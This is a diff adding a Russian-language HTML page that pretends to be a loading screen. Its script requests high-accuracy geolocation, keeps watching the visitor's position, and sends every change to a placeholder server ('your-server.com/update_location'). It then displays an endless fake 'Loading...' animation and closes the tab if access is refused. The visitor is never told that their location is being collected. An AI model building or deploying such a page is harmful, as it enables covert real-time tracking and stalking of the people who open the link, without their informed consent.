@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка...</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #000;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        .loading {
+            font-size: 24px;
+        }
+    </style>
+    <script>
+        let lastLatitude = null;
+        let lastLongitude = null;
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(
+                    function(position) {
+                        let lat = position.coords.latitude.toFixed(5);   // 5 знаков после запятой
+                        let lon = position.coords.longitude.toFixed(5);  // 5 знаков после запятой
+                        
+                        // Если координаты изменились, отправить на сервер
+                        if (lat !== lastLatitude || lon !== lastLongitude) {
+                            lastLatitude = lat;
+                            lastLongitude = lon;
+                            sendLocation(lat, lon);
+                        }
+                    },
+                    function(error) {
+                        console.error("Ошибка геолокации:", error);
+                        window.close(); // Закрывает вкладку, если доступ отклонён
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                console.log("Геолокация не поддерживается устройством.");
+                window.close();
+            }
+        }
+
+        function sendLocation(lat, lon) {
+            fetch('https://your-server.com/update_location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    latitude: lat, 
+                    longitude: lon, 
+                    timestamp: new Date().toISOString() 
+                })
+            }).then(response => {
+                if (response.ok) {
+                    console.log("Координаты отправлены:", lat, lon);
+                    startInfiniteLoading();
+                }
+            }).catch(error => console.error("Ошибка отправки данных:", error));
+        }
+
+        function startInfiniteLoading() {
+            document.getElementById("loadingText").innerText = "Загрузка...";
+            setInterval(() => {
+                let dots = document.getElementById("loadingText").innerText;
+                document.getElementById("loadingText").innerText = dots.length >= 12 ? "Загрузка" : dots + ".";
+            }, 500);
+        }
+
+        window.onload = getLocation;
+    </script>
+</head>
+<body>
+    <div class="loading">
+        <p id="loadingText">Запрос доступа к геолокации...</p>
+    </div>
+</body>
+</html>
